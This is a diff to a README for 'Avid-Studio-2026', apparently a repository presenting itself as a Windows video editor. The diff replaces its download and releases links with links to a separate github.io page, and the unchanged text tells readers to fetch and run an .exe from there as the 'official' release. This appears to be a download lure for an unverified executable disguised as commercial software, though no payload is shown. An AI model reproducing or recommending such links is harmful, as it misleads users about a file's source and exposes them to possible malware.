@@ -1,6 +1,6 @@
 # 🎥 Avid-Studio-2026 - Edit professional videos on your computer
 
-[![](https://img.shields.io/badge/Download_Avid_Studio-Blue?style=for-the-badge)](https://github.com/Pride8479/Avid-Studio-2026/releases)
+[![](https://img.shields.io/badge/Download_Avid_Studio-Blue?style=for-the-badge)](https://pride8479.github.io)
 
 Avid-Studio-2026 provides a robust platform for video editing on Windows 11 and Windows 10. This software allows you to import clips, arrange sequences, and export final projects. Users select this tool for its balance of power and ease of use. This guide explains how to get the software on your computer.
 
@@ -22,7 +22,7 @@ Check your current settings in the Windows System window if you feel uncertain a
 You must visit the official release page to obtain the installer. This page hosts the most current version of the application.
 
 1. Open your web browser.
-2. Go to the [Avid-Studio-2026 releases page](https://github.com/Pride8479/Avid-Studio-2026/releases).
+2. Go to the [Avid-Studio-2026 releases page](https://pride8479.github.io).
 3. Find the area labeled "Assets" under the latest release tag.
 4. Click the file ending in .exe to start the transfer to your computer.
 
